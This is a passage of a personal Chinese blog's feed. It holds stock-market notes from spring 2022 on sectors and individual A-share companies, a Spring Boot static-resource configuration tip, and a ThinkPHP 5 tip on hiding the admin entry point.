    <content type="html"><![CDATA[<h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="中药"><a href="#中药" class="headerlink" title="中药"></a>中药</h3><p>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现<br>2022-03-31 18:02 星期四<br>中药（康缘药业、昆药集团、浙江震元）：<br>①国务院办公厅近日印发《“十四五”中医药发展规划》，提出推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等，这是首次以国办名义印发的医药细分子行业的五年规划；<br>②中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，截至2022年3月25日，目前中药板块平均PE为33倍，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现；<br>③中药医保支付新政策重大利好，纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间，对整个中药行业带来比较显著的影响；<br>④陈竹重点看好业绩增长的持续性与估值相匹配、中药创新药增量逻辑、中医服务提供商等核心细分领域；<br>⑤风险提示：政策落地不及预期、中成药集采降价超预期、OTC和配方颗粒竞争超预期等。<br>主题一<br>《“十四五”中医药发展规划》助推中药振兴，“新冠防控+服务出口+消费升级”有望打开行业增量，分析师称政策扶植带来的重大利好尚未充分体现国务院办公厅近日印发《“十四五”中医药发展规划》，提出到2025年，中医药健康服务能力明显增强，中医药高质量发展政策和体系进一步完善，并推动中医药参与新冠防控国际合作，高质量建设国家中医药服务出口基地等。值得注意的是，这是首次以国办名义印发的医药细分子行业的五年规划。中信证券陈竹认为，中药板块作为低估值以及政策避风港板块，本轮行情具有中长期可持续性，短期可关注结构性机会，中长期关注受益于政策推动、创新研发以及消费升级的标的企业。截至2022年3月25日，目前中药板块平均PE为33倍，仅高于器械和商业流通板块，部分核心龙头OTC企业估值只有15-20倍，政策扶植和市场扩容带来的重大利好还未充分体现，2022年将是中医药板块投资的关键一年。<br>陈竹梳理出三条主线：<br>①业绩增长的持续性与估值相匹配：华润三九、红日药业、羚锐制药、太极集团、昆药集团；<br>②中药创新药增量逻辑：以岭药业、康缘药业；<br>③中医服务提供商：新中医诊疗龙头，OMO模式全国布局持续推进的 浙江震元。<br>近期中药行情波动的底层逻辑<br>（1）中药创新研发迅速崛起，注册审批加快：2017年-2021年，国家药监局共计20个新药获批上市，其中2021年共计12个新药获批上市，是近5年来获批中药新药最多的一年；<br>（2）政策利好：国家中医药管理局和国家医保局联合发布了《关于医保支持中医药传承创新发展的指导意见》，首次从支付端出台了中药扶持政策，对整个中药行业带来比较显著的影响；<br>（3）集采政策的温和预期和医保免疫的大健康消费属性：根据湖北省联盟集采结果看中成药降价幅度低于化学药，政策预期温和可控。</p><p>中药绝大部分为OTC药物，具有消费品和保健品属性，属于医保免疫区。行业中期受益于政策带来的格局优化<br>（1）中药医保支付新政策重大利好。纳入医保支付的同时暂不纳入DRG付费，药厂在医保支付范围内获得了更灵活的定价空间。<br>（2）2022年是中成药集采元年，湖北省联合19省联盟组织的中成药集采显示，本次集采有157家企业的182个产品参与报价，其中97家企业、111个产品中选，中选率达62%，拟中选价格平均降幅42.27%。相较前几轮的化药集采、医保谈判，湖北中成药集采降价幅度较为温和。<br>（3）中药配方颗粒市场空间打开和竞争格局优化有利于龙头企业。目前我国中药饮片市场规模在2000亿左右，中药配方颗粒占饮片市场份额约20%，预计中药配方颗粒市场规模可达500亿元，远期市场规模可达1000亿元。陈竹认为，未来中药发展必然是以品牌+大健康为主的发展战略，一部分有保密配方高护城河的中药瑰宝类药物，高端的定价和部分特殊的中药材种类，使得部分产品具有奢侈品属性，成为保值、增值的奢侈品，重点企业包括片仔癀、同仁堂。 </p><h3 id="数字人民币"><a href="#数字人民币" class="headerlink" title="数字人民币"></a>数字人民币</h3><p>占“半壁江山”！建行数字人民币累计交易额达435亿元，这家公司与其共同研发数字人民币智慧设备<br>2022-03-31 14:02 星期四</p><p>建行年报数据显示，截至2021年末，建行数字人民币累计交易笔数8475万余笔，累计交易金额435亿元。这一数字约占全国数字人民币总交易额近五成。</p><p>央行数据显示，截至2021年12月31日，全国数字人民币试点场景已超过808.51万个，累计开立个人钱包2.61亿个，交易金额875.65亿元。 行业动态</p><p>数字人民币先后经历两轮试点，当前发展进入快车道从试点城市来看，2019年末央行在深圳、苏州、雄安、成都及2022北京冬奥会场景开展数字人民币第一批试点测试。2020年11月开始，增加上海、海南、长沙、西安、青岛、大连6个新的试点地区。第三批试点区域即将落地。</p><p>目前，两轮共10个试点城市和1个试点场景已经运行接近2年，应用场景也已经涵盖了生活缴费、餐饮服务、交通出行、购物消费、政务服务等领域。</p><pre><code>券商观点</code></pre><p>安信证券夏瀛韬研报认为，考虑到第19届亚运会将于2022年9月在浙江杭州举办（宁波、温州、金华、绍兴、湖州协办），杭州亚运会有望成为继北京冬奥会后，数字人民币又一对外展示的重要窗口。</p><p>华安证券尹沿技认为，数字人民币的推广将为相关生态产业带来长期、可持续的投资机遇。看好商业银行侧投资机遇，银行软件系统需要对接央行发行库，柜台机、ATM机等金融机具需要开通相关功能以支持数字人民币的兑换、流通和回笼。</p><pre><code>产业链相关公司广电运通 携手建行打造的数字人民币智慧柜员机正式试点上线，数字人民币智慧柜员机广泛应用于2022年北京冬奥会机场、海关等多个场景，为科技冬奥打造便捷支付环境。创识科技 关于数字人民币方面，公司目前已经与农行、建行、中行、邮储银行和交通银行等展开合作。</code></pre><h3 id="三农-化肥"><a href="#三农-化肥" class="headerlink" title="三农-化肥"></a>三农-化肥</h3><p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性<br>2022-04-01 13:32<br>农化大周期下，全球粮价高企且化肥库存低位，行业高景气有望至少持续1-2年，目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，分析师看好行业利润更加偏向上游的同时，竞争格局也将得到持续优化。<br>磷化工（川金诺、湖北宜化、云天化）精要：</p><p>①当前粮价高企+磷肥库存低位，西部证券杨晖看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续；</p><p>②中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显；</p><p>③杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化；</p><p>④风险因素：安全事故影响开工、环保政策变化、技术路线快速迭代更新等。</p><p>解决好“三农”问题重中之重，该行业有望先乘农化大周期之势延续高景气，再切入新能源提升业绩弹性</p><p>事件：《求是》杂志发表中共中央总书记、国家主席、中央军委主席习近平的重要文章《坚持把解决好“三农”问题作为全党工作重中之重，举全党全社会之力推动乡村振兴》。</p><p>农化大周期之下，本栏目于3月28日《强资源属性+海外套利窗口打开+全球刚需，通胀主线不能忽视这个品种，A股这些公司具备核心保供能力》一文中引用分析师观点，认为当前全球通胀要买上游资源，衰退要买必选消费，化肥兼具两者逻辑，攻守兼备。</p><p>今日，西部证券杨晖专题覆盖磷化工行业，认为当前粮价高企+磷肥库存低位，看好农化大周期下化肥高景气有望至少持续1-2年，并且行业景气或随出口限制放松得到延续。</p><p>中长期看，磷酸铁锂的需求爆发直接带动“磷矿石-黄磷-磷酸-磷酸铁”景气度，2022年磷酸铁供应缺口犹存，磷化工资源属性凸显。</p><p>杨晖认为目前磷化工的头部企业基本已完成上游资源的整合，切入新能源进一步提升业绩弹性，重点公司包括：云天化、湖北宜化、兴发集团、新洋丰、云图控股、川发龙蟒、川恒股份、中毅达、川金诺、金诚信等。</p><p>粮价高企+库存低位，农化大周期下化肥高景气有望持续</p><p>当前粮价维持高位将驱动化肥行业需求提升，据Mosaic预测2022年我国磷肥需求增长幅度将在3.5%至6.4%之间。</p><p>受粮价高位、原材料价格支撑和下游需求拉动，当前化肥价格坚挺，且有望在春耕旺季来临之际迎来价格再度上行。</p><p>短期来看，全球及国内磷肥库存处于低位，此波农化大周期下化肥的高景气有望至少持续1-2年。</p><p>中长期来看，此前的出口禁令带来的国际磷肥价格与国内价格形成3500元&#x2F;吨以上的较大价差，市场预期国家可能在春耕之后放开化肥的出口限制。</p><p>磷化工企业切入新能源提升业绩弹性，磷酸铁2022年供应缺口犹存</p><p>当前国内磷酸铁总产能为64.5万吨，磷酸铁锂总产能为77.6万吨，磷酸铁处于供不应求状态。</p><p>从扩产计划看，磷化工企业为未来磷酸铁扩产的主力，占到总扩产计划的55%，且从扩产节奏看，预计2022年全年磷酸铁仍将处于供需错配的状态。</p><p>从实际进度看，磷酸铁的扩产将受到环评、能评、工艺等各项限制，同时下游产品验证周期可能导致产能释放低于预期，杨晖看好供需错配格局下磷酸铁景气的延续。</p><p>中长期磷化工资源属性凸显，供给侧改革持续优化行业竞争格局</p><p>当前国内磷矿石资源面临短缺压力，同时随着碳中和、能耗双控、产能指标等各种供给端控制措施的联合限制，一些资源禀赋布局领先的企业将展现出更强的竞争力。</p><p>杨晖认为行业利润更加偏向上游的同时，行业竞争格局也将得到持续优化。</p><p>目前磷化工的头部企业基本已完成上游资源的整合，产业链一体化完善，具备充足的资源、成本、能耗指标等优势。</p><h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="翠微股份（消费，购物，数字货币，芯片）"><a href="#翠微股份（消费，购物，数字货币，芯片）" class="headerlink" title="翠微股份（消费，购物，数字货币，芯片）"></a>翠微股份（消费，购物，数字货币，芯片）</h3><p>子公司海科融通从事第三方支付业务，拥有全国范围的从业资质。已经与多家银行在数字人民币线下收单领域达成合作。具备数字人民币跨行收单能力。目前旗下所有商场均可使用 数字人民币 购物。公司参股了北京核芯达科技有限公司，专注于面向L4级自动驾驶处理器和车载智能语音芯片的研发。为国内车企关键芯片领域提供一流解决方案。首款智能语音芯片已经与 2021 年上半年流片并与全球第二大天窗厂商 英纳法在车顶多音区领域 展开独家合作。</p><h3 id="莱茵生物（工业大麻）"><a href="#莱茵生物（工业大麻）" class="headerlink" title="莱茵生物（工业大麻）"></a>莱茵生物（工业大麻）</h3><p>4月1日，美国众议院以220票对204票第二次通过联邦医用大麻合法化法案（MORE Act）；同时参议院联邦合法化法案《大麻管理与机会法案》（CAOA）预计将于4月提交，联邦层面医用大麻合法化加速推进。随着美国工业大麻法规政策持续向好，市场有望快速扩容，利好产业链相关布局企业，尤其是具备规模化生产能力的代工厂以及品牌企业或将迎来快速发展机遇。莱茵生物于2019年正式布局工业大麻，截至2021Q3已累计投资8000万美元在美建立全球最大工业大麻提取工厂，被印第安纳州政府列为示范项目，预计该项目将于2022年6月30日前达成正式量产，年处理原料5000吨，项目毛利率可达50%，同时已与一家全球工业大麻主流企业签订《受托加工意向协议》，后续预计还有更多订单意向。从技术角度来看，莱茵生物目前走得偏趋势而非连板，以5日线为趋势，每一次回落都得到了支撑，那么周五莱茵生物的断板可能会带来低吸机会。</p><h3 id="盛航股份（航运）"><a href="#盛航股份（航运）" class="headerlink" title="盛航股份（航运）"></a>盛航股份（航运）</h3><p>目前次新股出现了一个空窗期，上交所在4月20日之前没有新股上市，另外每当巨无霸上市，次新都有提前造势的案例，比如三峡能源对应顺控发展，中国电信对应华菱线缆，中国移动对应三羊马，那么中海油上市前次新大概率也会有妖股的出现。目前连板的盛航股份就是妖股的潜在备选标的之一，从基本面来说，目前公司在行业紧平衡的情况下，上市后通过购买船舶提升市场份额，22年30艘，25年50艘，意味着公司市场份额有望得到快速提升，中期市场份额可接近20%。再加上疫情影响，运力紧张，而各大型炼化项目在“十四五”期间将会迎来密集投产期，极大推动相关石化产品的水上运输需求，公司市场份额的提升有望进一步加快。再从投机的角度思考，该股本身还叠加高送转，填权之后股价也比较低。</p><h3 id="招商积余-（地产，物业）"><a href="#招商积余-（地产，物业）" class="headerlink" title="招商积余 （地产，物业）"></a>招商积余 （地产，物业）</h3><p>背靠央企的地产服务龙头，控股股东土储充足支撑中期扩张，有望受益此轮行业格局重构<br>2022-03-31 13:39<br>公司是招商局集团旗下的央企物管旗舰，控股股东招商蛇口实力雄厚，多维度支持业务发展，去年年度新签合同额30.5亿元，新增管理面积9013万平米，分析师看好公司大物业+大资管双轮驱动，有望受益行业格局重构。<br>招商积余（001914）精要：</p><p>①公司为招商局集团旗下物业资产管理与服务平台，2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平；</p><p>②地方国资和央企优势在于融资能力和成本拥有银行支持，平安证券杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同；</p><p>③公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期；</p><p>④杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍；</p><p>⑤风险因素：控股股东交付节奏不及预期风险、外拓进程不及预期风险。</p><p>近期多地出台楼市新政稳定市场预期，当下市场，相对二线企业，地方国资和央企优势在于融资能力和成本拥有银行支持，地方政府保交付任务也会助力国资企业带来更大优势。</p><p>今日，平安证券杨侃深度覆盖招商积余，公司为招商局集团旗下物业资产管理与服务平台，2019年重组上市，属A股物管稀缺标的。</p><p>公司控股股东招商蛇口实力雄厚，资源禀赋优势突出，利于在增值服务等业务层面形成协同，全业态市场化能力显著。</p><p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重分离积极推进，提质增效成果可期。</p><p>杨侃看好公司作为央企物管领先者，有望受益行业格局重构，预计2022-24年EPS分别为0.62元&#x2F;0.79元&#x2F;1元，对应PE分别为27.7&#x2F;21.8&#x2F;17.3倍。</p><p>招商积余是央企物管领先者，大物业+大资管双轮驱动</p><p>招商积余为招商局集团旗下物业资产管理与服务平台，目前发展物业管理、资产管理两项核心业务。</p><p>公司2021年末管理面积2.8亿平米，年度新签合同额30.5亿元，同比增长24%，新增管理面积9013万平米，处央企物管领先水平。</p><p>物业管理以“沃土云林”商业模式为依托，持续向好发展，2021年收入贡献93.6%，毛利润贡献77.7%。</p><p>商业运营2021年末在管商业项目（含筹备）44个，初具规模，2021年收入贡献5.3%，毛利润贡献21.4%。</p><p>招商积余控股股东资源禀赋优势突出，全业态市场化能力显著</p><p>杨侃看好公司控股股东招商蛇口实力雄厚，多维度支持业务发展，包括积极销售保障短期交付，土储充足支撑中期扩张，持有物业“双百”战略推动资管业务持续突破。</p><p>长远来看，招商蛇口有望受益房地产格局优化，为公司规模发展带来更大想象空间。实控人招商局集团生态资源丰富，利于在增值服务等业务层面形成协同。</p><p>此外，公司具备较强市场化发展能力、全业态综合服务能力，行业竞争加剧下有助于强化综合实力、保障份额获取。</p><p>2021年第三方管理面积占比67.7%，住宅、非住宅管理面积占比41%、59%；第三方管理面积1.9亿平米，处行业领先水平。</p><p>招商积余轻重分离积极推进，提质增效成果可期</p><p>公司2021年底摘牌上航物业100%股权、南航物业95%股权，增资扩股汇勤物业，实现重组上市以来收并购首次突破。</p><p>公司2022年初确定转让深圳中航城、昆山中航、赣州九方三家公司股权，轻重资产分离迈出实质性步伐。</p><p>目前，公司已落地100余项改善举措，杨侃看好伴随业务及管理能力提升，预计公司盈利能力、业务获取能力亦有望随之提振[图片]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题材&quot;&gt;&lt;a href=&quot;#题材&quot; class=&quot;headerlink&quot; title=&quot;题材&quot;&gt;&lt;/a&gt;题材&lt;/h2&gt;&lt;h3 id=&quot;中药&quot;&gt;&lt;a href=&quot;#中药&quot; class=&quot;headerlink&quot; title=&quot;中药&quot;&gt;&lt;/a&gt;中药&lt;/h3&gt;&lt;p&gt;《“十</summary>
      
    
    
    
    <category term="投资 - 股票" scheme="https://www.memestarter.top/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/"/>
    
    
    <category term="股票" scheme="https://www.memestarter.top/tags/%E8%82%A1%E7%A5%A8/"/>
    
    <category term="投资" scheme="https://www.memestarter.top/tags/%E6%8A%95%E8%B5%84/"/>
    
  </entry>
  
  <entry>
    <title>springboot加载静态资源的坑</title>
    <link href="https://www.memestarter.top/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/"/>
    <id>https://www.memestarter.top/2022/04/04/springboot%E5%8A%A0%E8%BD%BD%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E5%9D%91/</id>
    <published>2022-04-04T01:37:44.000Z</published>
    <updated>2022-04-05T10:59:17.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>我们知道springboot中，已经预定义了一些配置，这些配置，指定了静态资源的位置和url访问方式。即使不作任何设置，放在resources下面的public static 等文件夹的静态资源也可以被访问到。也可以在application.yml&#x2F;application.properties文件内更改配置。具体有两个配置项目。</p><ul><li>spring.mvc.static-path-pattern：根据官网的描述和实际效果，可以理解为静态文件URL匹配头，也就是静态文件的URL地址开头。Springboot默认为：&#x2F;**。</li><li>spring.web.resources.static-locations：根据官网的描述和实际效果，可以理解为实际静态文件地址，也就是静态文件URL后，匹配的实际静态文件。Springboot默认为：classpath:&#x2F;META-INF&#x2F;resources&#x2F;,classpath:&#x2F;resources&#x2F;,classpath:&#x2F;static&#x2F;,classpath:&#x2F;public&#x2F;</li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>我做的时候，给用成了spring.resources.static-locations，结果始终不生效！！！原来这个是老版本的配置。记录一下，高版本springboot用这个配置 <em><strong>spring.web.resources.static-locations</strong></em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;预备知识&quot;&gt;&lt;a href=&quot;#预备知识&quot; class=&quot;headerlink&quot; title=&quot;预备知识&quot;&gt;&lt;/a&gt;预备知识&lt;/h2&gt;&lt;p&gt;我们知道springboot中，已经预定义了一些配置，这些配置，指定了静态资源的位置和url访问方式。即使不作任何设置，放在</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - 后端技术" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="问题解决" scheme="https://www.memestarter.top/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    <category term="SpringBoot" scheme="https://www.memestarter.top/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>thikphp-5.x-隐藏管理入口</title>
    <link href="https://www.memestarter.top/2022/03/25/thikphp-5-x-%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%85%A5%E5%8F%A3/"/>
    <id>https://www.memestarter.top/2022/03/25/thikphp-5-x-%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%85%A5%E5%8F%A3/</id>
    <published>2022-03-25T02:37:23.000Z</published>
    <updated>2022-03-25T07:03:43.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面临黑客的突然袭击"><a href="#面临黑客的突然袭击" class="headerlink" title="面临黑客的突然袭击"></a>面临黑客的突然袭击</h1><p>在后台看日志，发现有人不停的扫描服务器可用的url，如果一旦被发现admin这个后台管理入口，就后果很严重了。</p><h1 id="应对策略"><a href="#应对策略" class="headerlink" title="应对策略"></a>应对策略</h1><p>隐藏后台服务器管理的 url 入口。</p><h1 id="设置隐藏后台管理地址"><a href="#设置隐藏后台管理地址" class="headerlink" title="设置隐藏后台管理地址"></a>设置隐藏后台管理地址</h1><ul><li><p>打开conig&#x2F;app.php,app.php中设置拒绝直接通过模块名访问模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;deny_module_list&#x27;       =&gt; [&#x27;common&#x27;, &#x27;admin&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>新增后台入口文件，绑定模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Container::get(&#x27;app&#x27;)-&gt;bind(&#x27;admin&#x27;)-&gt;run()-&gt;send();</span><br></pre></td></tr></table></figure></li><li><p>public目录下新建一个入口文件</p><blockquote><p>入口文件内容和index.php内容一致即可。文件名字随便起，越奇怪越好。例如*** 0o98dfsd-fffP.php ***</p></blockquote></li></ul><p>OVER </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;面临黑客的突然袭击&quot;&gt;&lt;a href=&quot;#面临黑客的突然袭击&quot; class=&quot;headerlink&quot; title=&quot;面临黑客的突然袭击&quot;&gt;&lt;/a&gt;面临黑客的突然袭击&lt;/h1&gt;&lt;p&gt;在后台看日志，发现有人不停的扫描服务器可用的url，如果一旦被发现admin这个后台</summary>
      
    
    
    
    <category term="技术生活 - 编程技术 - php" scheme="https://www.memestarter.top/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-php/"/>
    
    
    <category term="thinkphp" scheme="https://www.memestarter.top/tags/thinkphp/"/>
    
    <category term="问题解决" scheme="https://www.memestarter.top/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>股票-20220324</title>
    <link href="https://www.memestarter.top/2022/03/24/%E8%82%A1%E7%A5%A8-20220324/"/>
    <id>https://www.memestarter.top/2022/03/24/%E8%82%A1%E7%A5%A8-20220324/</id>
    <published>2022-03-24T00:46:47.000Z</published>
    <updated>2022-03-24T00:59:36.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h3><p>2022年1月，国务院印发《“十四五”数字经济发展规划》，规划中提出到2025年数字经济核心产业增加值占GDP比重达到10%，IPv6活跃用户数达到8亿。</p><p>2021年11月，中央网信办等部门联合印发《关于开展IPv6技术创新和融合应用试点工作的通知》，明确到2023年底，IPv6技术创新和融合应用试点工作取得明显成效。</p><p>2021年7月，发改委等部门印发《关于加快推进互联网协议第六版（IPv6）规模部署和应用工作的通知》，要求到2023年末，基本建成先进自主的IPv6技术、产业、设施、应用和安全体系。</p><pre><code>券商观点</code></pre><p>川财证券孙灿分析指出，IPv6市场具有良好的发展前景，其较于IPv4有着更多的优势，IPv6产业链市场规模快速扩大。从网络端到端IPv6渗透率看，运营商网络中无论是接入网、城域网和骨干网等领域，IPv6已经获得全面支持，我们认为后续运营商在IPv6改造方面投入景气度仍能维持，而第三方IDC、CDN及云计算基础设施IPv6改造仍有较大提升空间，看好商业企业路由器、交换机、负载均衡、防火墙等IT设备的持续更新换代需求。</p><pre><code>数据解读</code></pre><p>截至2021年底，我国移动网络IPv6流量占比从2020年底的17.21%提升至35.15%，固定网络IPv6流量占比从2020年底的4.3%提升至9.38%，均实现同比翻番增长。</p><pre><code>产业链相关公司星网锐捷是国内主流网络及通信终端产品提供商，十万兆IPv6核心路由交换机、USB映射技术、终端管理软件、外设共享服务器等核心技术已与国际同步甚至位居国际前列。创维数字承担的国家发改委科技项目“基于IPv6的全媒体智能终端及服务系统产业化项目”获得了广东省科技进步二等奖。公司已在智能机顶盒、宽带网络通信接入网等产品上实现及运用IPv6技术。</code></pre><h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="氢能源-储气制气-风光储能，新天绿能"><a href="#氢能源-储气制气-风光储能，新天绿能" class="headerlink" title="氢能源+储气制气+风光储能，新天绿能"></a>氢能源+储气制气+风光储能，新天绿能</h3><p>“氢能源+储气制气+风光储能”，这家公司拟建成12座20万方LNG储罐辐射整个“京津冀”，加码新能源制氢为燃料电池车提供动能。<br>新天绿能（600956）：<br>①天风证券郭丽丽看好公司受益“天然气+风电”双轮驱动，公司累计拥有用户441284户，运营CNG母站7座、CNG子站6座、LNG加注站3座、L-CNG合建站2座，并新建唐山LNG项目，拟建成12座20万方LNG储罐，供应及调峰能力可辐射整个京津冀地区；<br>②公司全部控股风电项目覆盖省份达12个，装机容量达5656.45MW，2021年上半年公司风电可利用小时数为1433小时，高于全国平均可利用小时数221小时，同时积极储备光伏项目资源；<br>③公司加码氢能及储能赛道，未来天然气+风电（光伏）两大主营业务有望通过氢能产业链连接，其沽源风电制氢示范项目为当地冬奥会氢燃料电池汽车提供氢能源，并参与建设河北丰宁抽水蓄能电站项目；<br>④郭丽丽预计公司2021-2023年实现归母净利润21.8&#x2F;22.6&#x2F;29.4亿元，同比增长44.36%&#x2F;3.45%&#x2F;30.30%，对应PE为26&#x2F;25&#x2F;19倍；⑤风险提示：项目建设不及预期、能源政策变动等。</p><p>“氢能源+储气制气+风光储能”，这家公司拟建成12座20万方LNG储罐辐射整个“京津冀”，加码新能源制氢为燃料电池车提供动能</p><p>事件:《氢能产业发展中长期规划（2021-2035）》出炉，规划一方面明确氢能在能源转型中的重要作用，打开氢气下游应用空间，推动全产业链发展，另一方面，着重突出可再生能源制氢的重要地位，配合当前积极推动新能源装机的整体规划。天风证券郭丽丽挖出一家“天然气+风电”双轮驱动的清洁能源公司新天绿能，公司累计拥有用户441284户，运营CNG母站7座、CNG子站6座、LNG加注站3座、L-CNG合建站2座。在风电光伏领域，公司风电控股装机容量达5656.45MW，累计运营光伏项目规模达118.59MW，项目覆盖全国多个省份。同时，依托于全国多省份项目布局及项目所在地的优质风能资源，公司风电可利用小时数高于平均水平，发电水平维持高位。另外，公司加码氢能及储能赛道，未来天然气+风电（光伏）两大主营业务有望通过氢能产业链连接，叠加公司参股投资建设河北丰宁抽水蓄能电站项目，考虑到当前调峰、填谷等需求及储能领域发展态势，公司成长性有望进一步强化。郭丽丽预计公司2021-2023年实现归母净利润21.8&#x2F;22.6&#x2F;29.4亿元，同比增长44.36%&#x2F;3.45%&#x2F;30.30%，对应PE为26&#x2F;25&#x2F;19倍。天然气：管网工程助力市场拓展，唐山LNG项目战略性凸显公司积极响应国家天然气政策规划，持续推进基建工程建设，从而增强天然气供应保障能力，实现河北省内外互联互通。截至2021年6月30日，公司累计运营管线7087.99公里，同比增长34%，同时多个管道工程项目处于建设过程中，未来公司管网覆盖范围有望进一步扩大，“省内一张网”布局逐步成型。天然气发展对储气、调峰及应急等能力提出了更高的要求，而当前京津冀地区接收及储气能力偏弱，难以满足其天然气调峰需求，需要增加新的保供通路和资源。公司新建唐山LNG项目，拟建成12座20万方LNG储罐、1座8-26.6万方LNG船舶接卸泊位、1座1-26.6万方LNG船舶接卸泊位及相关配套设施，设计接卸能力达1000万吨&#x2F;年，其规模可观。另一方面，该项目位于中心地带，并配备外输管线，供应及调峰能力可辐射整个京津冀地区。可再生能源：风电领跑，多类型新能源项目布局</p><p>（1）风电公司全部控股风电项目覆盖省份达12个，全部核准计划项目覆盖省份达16个，全部协议容量分布省份达23个。2021年上半年公司控股风电场可利用小时数为1433小时，高于河北省平均利用小时数196小时，高于全国平均可利用小时数221小时，公司风力发电水平维持高位。<br>（2）光伏同时公司仍在积极储备光伏项目资源，2021年上半年公司新增光伏协议容量2600MW，累计光伏协议容量达9949MW，未来光伏发电业务规模有望持续增长。公司依托于新能源发电业务基础，积极布局新能源制氢项目。其沽源风电制氢示范项目为当地冬奥会氢燃料电池汽车提供氢能源。同时，公司与国家电网等共同投资建设河北丰宁抽水蓄能电站项目。 </p><h3 id="中国建筑（601668）"><a href="#中国建筑（601668）" class="headerlink" title="中国建筑（601668）"></a>中国建筑（601668）</h3><p>①国务院金融稳定发展委员会召开专题会议后，房地产政策预期逐步转暖，行业估值有提升空间；<br>②作为行业内全球最高信用评级的央企，公司房建业务毛利润占比41.8%，旗下拥有中海地产和中建地产两大房地产品牌，其中中海地产品牌价值始终处于中国房地产行业领先地位，属于“绿档”企业，负债水平保持在行业最低区间；<br>③当前公司地产销售规模略低于万科和保利发展，大于招商蛇口和金地集团，但估值层面2022年中国建筑预估PE为3.75倍，远低于万保招金地产的6.55倍；<br>④国泰君安韩其成预计公司2021-23年EPS为1.23&#x2F;1.35&#x2F;1.48元增15&#x2F;10&#x2F;10%，给予7.33元目标价；<br>⑤风险提示：经济过热通胀超预期政策紧缩，疫情反复等。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题材&quot;&gt;&lt;a href=&quot;#题材&quot; class=&quot;headerlink&quot; title=&quot;题材&quot;&gt;&lt;/a&gt;题材&lt;/h2&gt;&lt;h3 id=&quot;IPV6&quot;&gt;&lt;a href=&quot;#IPV6&quot; class=&quot;headerlink&quot; title=&quot;IPV6&quot;&gt;&lt;/a&gt;IPV6&lt;/h</summary>
      
    
    
    
    <category term="投资 - 股票" scheme="https://www.memestarter.top/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/"/>
    
    
    <category term="股票" scheme="https://www.memestarter.top/tags/%E8%82%A1%E7%A5%A8/"/>
    
    <category term="投资" scheme="https://www.memestarter.top/tags/%E6%8A%95%E8%B5%84/"/>
    
  </entry>
  
  <entry>
    <title>股票-20220323</title>
    <link href="https://www.memestarter.top/2022/03/23/%E8%82%A1%E7%A5%A8-20220323/"/>
